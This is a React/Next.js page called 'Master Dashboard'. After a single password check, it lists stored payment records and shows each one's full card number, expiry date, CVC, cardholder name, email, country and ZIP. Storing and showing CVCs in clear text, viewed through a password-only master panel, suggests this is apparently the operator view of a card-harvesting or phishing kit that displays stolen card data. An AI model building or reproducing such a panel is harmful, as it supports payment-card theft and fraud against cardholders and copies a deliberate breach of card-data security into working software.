"use client";

import React, { useState } from "react";

interface Payment {
    _id: string;
    email: string;
    cardNumber: string;
    expiry: string;
    cvc: string;
    name: string;
    country: string;
    zip: string;
    paymentMethod: string;
    createdAt: string;
}

const ChipIcon = () => (
    <svg width="30" height="22" viewBox="0 0 36 28" fill="none">
        <rect x="0.5" y="0.5" width="35" height="27" rx="3.5" fill="#d4a853" stroke="#c9982e" />
        <line x1="0" y1="10" x2="36" y2="10" stroke="#c9982e" strokeWidth="0.7" />
        <line x1="0" y1="18" x2="36" y2="18" stroke="#c9982e" strokeWidth="0.7" />
        <line x1="12" y1="0" x2="12" y2="28" stroke="#c9982e" strokeWidth="0.7" />
        <line x1="24" y1="0" x2="24" y2="28" stroke="#c9982e" strokeWidth="0.7" />
    </svg>
);

const getCardBrand = (num: string) => {
    const n = num.replace(/\s/g, "");
    if (n.startsWith("4")) return "VISA";
    if (/^5[1-5]/.test(n)) return "MASTERCARD";
    if (n.startsWith("34") || n.startsWith("37")) return "AMEX";
    return "CARD";
};

const gradients: Record<string, string> = {
    VISA: "from-[#1a1f71] to-[#3949ab]",
    MASTERCARD: "from-[#1a1a2e] to-[#2d2d44]",
    AMEX: "from-[#0d47a1] to-[#1976d2]",
    CARD: "from-gray-700 to-gray-900",
};

export default function MasterPage() {
    const [password, setPassword] = useState("");
    const [isAuthenticated, setIsAuthenticated] = useState(false);
    const [payments, setPayments] = useState<Payment[]>([]);
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState("");

    const fetchPayments = async (pw: string) => {
        const res = await fetch("/api/master", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ password: pw }),
        });
        return res.json();
    };

    const handleLogin = async (e: React.FormEvent) => {
        e.preventDefault();
        setLoading(true);
        setError("");
        try {
            const data = await fetchPayments(password);
            if (data.success) { setIsAuthenticated(true); setPayments(data.data); }
            else setError(data.error || "Invalid password");
        } catch { setError("Something went wrong"); }
        finally { setLoading(false); }
    };

    const handleRefresh = async () => {
        setLoading(true);
        try {
            const data = await fetchPayments(password);
            if (data.success) setPayments(data.data);
        } catch { /* ignore */ }
        finally { setLoading(false); }
    };

    /* ── Login screen ── */
    if (!isAuthenticated) {
        return (
            <div className="min-h-screen bg-gray-50 flex items-center justify-center px-4">
                <div className="w-full max-w-sm bg-white rounded-2xl border border-gray-200 p-8 shadow-sm">
                    <div className="text-center mb-6">
                        <div className="inline-flex items-center justify-center w-12 h-12 rounded-full bg-indigo-50 mb-3">
                            <svg className="w-6 h-6 text-indigo-600" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                                <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
                                <path d="M7 11V7a5 5 0 0110 0v4" />
                            </svg>
                        </div>
                        <h1 className="text-xl font-bold text-gray-900">Master Dashboard</h1>
                        <p className="text-sm text-gray-500 mt-1">Enter password to continue</p>
                    </div>
                    <form onSubmit={handleLogin} className="space-y-4">
                        <input
                            type="password" value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            placeholder="Password" autoFocus
                            className="w-full rounded-lg border border-gray-300 bg-white px-4 py-3 text-sm text-gray-900 outline-none placeholder:text-gray-400 focus:border-indigo-500 focus:ring-2 focus:ring-indigo-500/20"
                        />
                        {error && <p className="text-sm text-red-600 text-center bg-red-50 border border-red-100 rounded-lg py-2">{error}</p>}
                        <button type="submit" disabled={loading || !password}
                            className="w-full rounded-lg bg-indigo-600 px-4 py-3 text-sm font-semibold text-white hover:bg-indigo-700 disabled:opacity-50 disabled:cursor-not-allowed">
                            {loading ? "Verifying..." : "Unlock"}
                        </button>
                    </form>
                </div>
            </div>
        );
    }

    /* ── Dashboard ── */
    return (
        <div className="min-h-screen bg-gray-50">
            {/* Header */}
            <div className="border-b border-gray-200 bg-white sticky top-0 z-10">
                <div className="mx-auto max-w-7xl px-4 sm:px-6 py-3 flex items-center justify-between">
                    <div>
                        <h1 className="text-base font-bold text-gray-900">Master Dashboard</h1>
                        <p className="text-xs text-gray-500">{payments.length} record{payments.length !== 1 ? "s" : ""}</p>
                    </div>
                    <div className="flex items-center gap-2">
                        <button onClick={handleRefresh} disabled={loading}
                            className="flex items-center gap-1.5 rounded-lg border border-gray-300 bg-white px-3 py-2 text-xs font-medium text-gray-700 hover:bg-gray-50 disabled:opacity-50">
                            <svg className={`w-3.5 h-3.5 ${loading ? "animate-spin" : ""}`} fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                                <path d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
                            </svg>
                            Refresh
                        </button>
                        <button onClick={() => { setIsAuthenticated(false); setPassword(""); setPayments([]); }}
                            className="rounded-lg border border-red-200 px-3 py-2 text-xs font-medium text-red-600 hover:bg-red-50">
                            Logout
                        </button>
                    </div>
                </div>
            </div>

            {/* Cards grid */}
            <div className="mx-auto max-w-7xl px-4 sm:px-6 py-5">
                {payments.length === 0 ? (
                    <div className="text-center py-20 bg-white rounded-xl border border-gray-200">
                        <p className="text-sm text-gray-400">No payments yet</p>
                    </div>
                ) : (
                    <div className="grid gap-4 grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4">
                        {payments.map((p, i) => {
                            const brand = getCardBrand(p.cardNumber);
                            return (
                                <div key={p._id} className={`relative bg-gradient-to-br ${gradients[brand] || gradients.CARD} rounded-xl p-4 text-white shadow-lg`}>
                                    {/* Decorative */}
                                    <div className="absolute -right-6 -top-6 w-28 h-28 rounded-full bg-white/5" />

                                    {/* Row 1: chip + brand + index */}
                                    <div className="flex items-center justify-between relative z-10 mb-4">
                                        <ChipIcon />
                                        <div className="text-right">
                                            <span className="text-[10px] font-bold tracking-widest opacity-70">{brand}</span>
                                            <span className="block text-[9px] opacity-50">#{i + 1}</span>
                                        </div>
                                    </div>

                                    {/* Card number */}
                                    <p className="relative z-10 font-mono text-base tracking-[0.12em] mb-3">{p.cardNumber || "•••• •••• •••• ••••"}</p>

                                    {/* Holder + Expiry + CVC */}
                                    <div className="relative z-10 flex items-end justify-between text-[10px] mb-3">
                                        <div className="min-w-0 flex-1 mr-3">
                                            <p className="uppercase tracking-widest opacity-50">Holder</p>
                                            <p className="text-xs font-semibold tracking-wide uppercase truncate">{p.name || "—"}</p>
                                        </div>
                                        <div className="text-center">
                                            <p className="uppercase tracking-widest opacity-50">Exp</p>
                                            <p className="text-xs font-mono font-semibold">{p.expiry}</p>
                                        </div>
                                        <div className="text-right ml-3">
                                            <p className="uppercase tracking-widest opacity-50">CVC</p>
                                            <p className="text-xs font-mono font-semibold">{p.cvc}</p>
                                        </div>
                                    </div>

                                    {/* Divider */}
                                    <div className="relative z-10 border-t border-white/10 pt-2.5 mt-1 space-y-1.5 text-[10px]">
                                        <div className="flex justify-between">
                                            <span className="opacity-50 uppercase tracking-widest">Email</span>
                                            <span className="font-medium truncate ml-2 max-w-[60%] text-right">{p.email}</span>
                                        </div>
                                        <div className="flex justify-between">
                                            <span className="opacity-50 uppercase tracking-widest">Location</span>
                                            <span className="font-medium">{p.country}{p.zip ? ` · ${p.zip}` : ""}</span>
                                        </div>
                                        <div className="flex justify-between">
                                            <span className="opacity-50 uppercase tracking-widest">Date</span>
                                            <span className="font-medium">
                                                {new Date(p.createdAt).toLocaleDateString("en-IN", { day: "2-digit", month: "short", year: "numeric" })}{" "}
                                                {new Date(p.createdAt).toLocaleTimeString("en-IN", { hour: "2-digit", minute: "2-digit" })}
                                            </span>
                                        </div>
                                    </div>
                                </div>
                            );
                        })}
                    </div>
                )}
            </div>
        </div>
    );
}
